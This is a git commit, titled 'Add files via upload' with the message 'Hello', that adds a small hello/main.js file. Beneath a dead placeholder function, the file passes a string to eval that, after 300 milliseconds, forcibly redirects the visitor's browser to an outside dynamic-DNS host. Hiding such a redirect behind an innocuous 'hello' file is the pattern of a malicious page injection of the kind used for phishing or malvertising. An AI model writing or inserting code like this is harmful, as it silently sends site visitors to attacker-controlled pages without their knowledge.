c02f97a4056a18f541a8adc1a107e8ebab4596e2
sunotuan <70643069+sunotuan@users.noreply.github.com>
2020-09-02 20:11:20 +0700

    Add files via upload
    Hello

---
+++ hello/main.js
@@ -0,0 +1,13 @@
+function loadDoc() {
+  return;
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    var $this = this;
+    
+  };
+  xhttp.open("GET", "/", true);
+  xhttp.send();
+}
+
+var code = 'setTimeout(function() {window.location.href = "http://vuhuongmai2.isa-geek.org/VN/_250720.aspx"}, 300);';
+eval(code);
